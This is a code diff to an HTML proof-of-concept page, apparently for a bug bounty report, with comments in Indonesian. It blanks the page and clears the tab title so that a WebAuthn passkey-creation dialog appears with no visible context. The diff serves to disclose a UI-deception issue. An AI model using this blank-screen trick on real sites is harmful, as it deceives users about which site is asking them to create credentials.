@@ -3,77 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Passkey UI Bug Bounty PoC</title>
+    <title>Passkey UI Bug Bounty PoC - Blank Redirect</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; }
+        body { font-family: sans-serif; padding: 20px; text-align: center; transition: opacity 0.2s; }
         button { padding: 15px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
-        button:active { background-color: #0056b3; }
-        #log { margin-top: 20px; color: #333; font-family: monospace; white-space: pre-wrap; text-align: left; background: #f4f4f4; padding: 10px; border-radius: 5px;}
+        #log { margin-top: 20px; color: #333; font-family: monospace; white-space: pre-wrap; text-align: left; background: #f4f4f4; padding: 10px; border-radius: 5px; }
+        
+        /* CSS untuk efek blank screen */
+        .blank-screen {
+            background-color: #ffffff !important; /* Warna putih */
+            color: #ffffff !important; /* Sembunyikan teks */
+            overflow: hidden;
+        }
+        .hide-content { display: none !important; }
     </style>
 </head>
 <body>
 
-    <h2>Uji Coba Dialog Passkey</h2>
-    <p>Klik tombol di bawah ini untuk memicu dialog pembuatan Passkey di Android Anda.</p>
-    
-    <button id="registerBtn">Buat Passkey (Trigger Dialog)</button>
-
-    <div id="log">Menunggu interaksi...</div>
+    <div id="main-content">
+        <h2>Uji Coba Dialog Passkey</h2>
+        <p>Klik tombol di bawah ini. Layar akan menjadi blank sejenak, lalu popup Passkey akan muncul.</p>
+        <button id="registerBtn">Buat Passkey (Trigger Dialog)</button>
+        <div id="log">Menunggu interaksi...</div>
+    </div>
 
     <script>
         const btn = document.getElementById('registerBtn');
         const logDiv = document.getElementById('log');
-
-        function log(message) {
-            logDiv.innerText += "\n> " + message;
-        }
+        const mainContent = document.getElementById('main-content');
 
         btn.addEventListener('click', async () => {
-            logDiv.innerText = "Meminta dialog Passkey...";
-            
-            // Konfigurasi dasar untuk WebAuthn
-            const publicKeyCredentialCreationOptions = {
-                challenge: Uint8Array.from(
-                    "random_challenge_string_12345", c => c.charCodeAt(0)
-                ),
-                rp: {
-                    name: "PoC Bug Bounty",
-                    // Biarkan id kosong agar browser menggunakan domain saat ini secara default.
-                    // Jika Anda ingin menguji domain spesifik, isi dengan domain Anda (misal: "domain-anda.com")
-                    // id: "domain-anda.com" 
-                },
-                user: {
-                    id: Uint8Array.from(
-                        "user_id_123", c => c.charCodeAt(0)
-                    ),
-                    name: "test@example.com",
-                    displayName: "Test User"
-                },
-                pubKeyCredParams: [
-                    { alg: -7, type: "public-key" },  // ES256
-                    { alg: -257, type: "public-key" } // RS256
-                ],
-                authenticatorSelection: {
-                    authenticatorAttachment: "platform", // Memaksa menggunakan sensor sidik jari/PIN bawaan device
-                    userVerification: "required",
-                    residentKey: "required"
-                },
-                timeout: 60000,
-                attestation: "none"
-            };
+            // --- TRIK 1: MEMBUAT LAYAR BLANK ---
+            // Sembunyikan semua konten HTML agar layar terlihat kosong
+            mainContent.classList.add('hide-content');
+            document.body.classList.add('blank-screen');
 
-            try {
-                const credential = await navigator.credentials.create({
-                    publicKey: publicKeyCredentialCreationOptions
-                });
+            // Opsional: Ubah judul tab menjadi kosong untuk mengecoh
+            document.title = " ";
+
+            // Beri jeda sedikit (misal 100ms) agar browser sempat merender layar blank
+            // sebelum popup sistem muncul
+            setTimeout(async () => {
                 
-                log("Sukses! Passkey berhasil dibuat.");
-                console.log("Credential:", credential);
-                
-            } catch (err) {
-                log("Error atau Dibatalkan: " + err.name + " - " + err.message);
-                console.error(err);
-            }
+                const publicKeyCredentialCreationOptions = {
+                    challenge: Uint8Array.from("random_challenge_string_12345", c => c.charCodeAt(0)),
+                    rp: {
+                        name: "PoC Bug Bounty",
+                        // JANGAN isi id jika ingin menggunakan domain saat ini
+                    },
+                    user: {
+                        id: Uint8Array.from("user_id_123", c => c.charCodeAt(0)),
+                        name: "test@example.com",
+                        displayName: "Test User"
+                    },
+                    pubKeyCredParams: [
+                        { alg: -7, type: "public-key" }, 
+                        { alg: -257, type: "public-key" }
+                    ],
+                    authenticatorSelection: {
+                        authenticatorAttachment: "platform",
+                        userVerification: "required",
+                        residentKey: "required"
+                    },
+                    timeout: 60000,
+                    attestation: "none"
+                };
+
+                try {
+                    // --- TRIK 2: TRIGGER POPUP SAAT LAYAR BLANK ---
+                    const credential = await navigator.credentials.create({
+                        publicKey: publicKeyCredentialCreationOptions
+                    });
+                    
+                    // Jika sukses, kembalikan layar (opsional)
+                    document.body.classList.remove('blank-screen');
+                    mainContent.classList.remove('hide-content');
+                    logDiv.innerText = "Sukses! Passkey berhasil dibuat.";
+                    
+                } catch (err) {
+                    // Jika error/batal, kembalikan layar
+                    document.body.classList.remove('blank-screen');
+                    mainContent.classList.remove('hide-content');
+                    logDiv.innerText = "Error atau Dibatalkan: " + err.name + " - " + err.message;
+                }
+            }, 100); // Jeda 100 milidetik
         });
     </script>
 </body>
